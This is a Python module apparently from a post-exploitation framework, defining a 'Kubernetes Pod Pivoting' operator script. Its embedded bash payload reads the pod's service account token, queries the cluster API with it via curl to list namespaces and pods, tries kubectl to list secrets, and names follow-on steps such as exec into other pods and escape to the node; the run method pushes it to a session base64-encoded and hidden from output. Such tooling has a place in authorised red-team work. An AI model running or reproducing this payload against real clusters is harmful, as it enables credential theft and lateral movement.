"""Kubernetes pod-to-pod pivoting script."""

from ..base import OperatorScript, ScriptResult


class K8sPodPivoting(OperatorScript):
    """Pivot between Kubernetes pods and access cluster resources."""
    
    name = "Kubernetes Pod Pivoting"
    description = "Pivot between Kubernetes pods"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] KUBERNETES POD PIVOTING"
echo "==========================="
echo ""

echo "[+] Detecting Kubernetes environment:"
if [ ! -z "$KUBERNETES_SERVICE_HOST" ]; then
    echo "[+] Running inside Kubernetes"
    echo "    API Server: $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
else
    echo "[-] Not in Kubernetes environment"
    exit 0
fi
echo ""

echo "[+] Service account information:"
SA_PATH="/var/run/secrets/kubernetes.io/serviceaccount"
if [ -d "$SA_PATH" ]; then
    echo "[+] Service account mounted at $SA_PATH"
    ls -la "$SA_PATH"
    echo ""
    
    echo "[*] Namespace:"
    cat "$SA_PATH/namespace" 2>/dev/null
    echo ""
    
    echo "[*] CA Certificate:"
    ls -la "$SA_PATH/ca.crt"
    
    TOKEN=$(cat "$SA_PATH/token" 2>/dev/null)
    if [ ! -z "$TOKEN" ]; then
        echo "[!] Service account token found (length: ${#TOKEN})"
        echo "    Token preview: ${TOKEN:0:50}..."
    fi
else
    echo "[-] No service account mounted"
fi
echo ""

echo "[+] Kubernetes API access test:"
if [ ! -z "$TOKEN" ]; then
    APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
    CACERT="$SA_PATH/ca.crt"
    
    echo "[*] Testing API access..."
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
        "$APISERVER/api/v1/namespaces" 2>/dev/null | head -20 || \
        echo "[-] API access denied or failed"
    
    echo ""
    echo "[*] Listing pods in current namespace:"
    NAMESPACE=$(cat "$SA_PATH/namespace" 2>/dev/null)
    curl -s --cacert "$CACERT" -H "Authorization: Bearer $TOKEN" \
        "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" 2>/dev/null | grep "name" | head -20
else
    echo "[-] No token available for API access"
fi
echo ""

echo "[+] Network discovery (other pods):"
nslookup kubernetes.default 2>/dev/null || echo "[-] nslookup not available"
echo ""

echo "[+] Pod network information:"
ip addr show | grep -E "eth|inet"
echo ""

echo "[+] Checking for kubectl:"
if command -v kubectl &>/dev/null; then
    echo "[+] kubectl is available!"
    kubectl version --client
    kubectl get pods 2>/dev/null || echo "[-] Insufficient permissions"
    kubectl get secrets 2>/dev/null || echo "[-] Cannot list secrets"
else
    echo "[-] kubectl not available"
fi
echo ""

echo "[+] Kubernetes environment variables:"
env | grep -i kube
echo ""

echo "[+] Common Kubernetes exploits:"
echo "  1. Exec into other pods: kubectl exec -it POD -- /bin/sh"
echo "  2. List secrets: kubectl get secrets"
echo "  3. Escape to node: mount host filesystem"
echo "  4. Exploit API: abuse service account permissions"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Enumerating Kubernetes environment...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Kubernetes pod pivoting executed",
                metadata={"script": "k8s_pod_pivoting"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
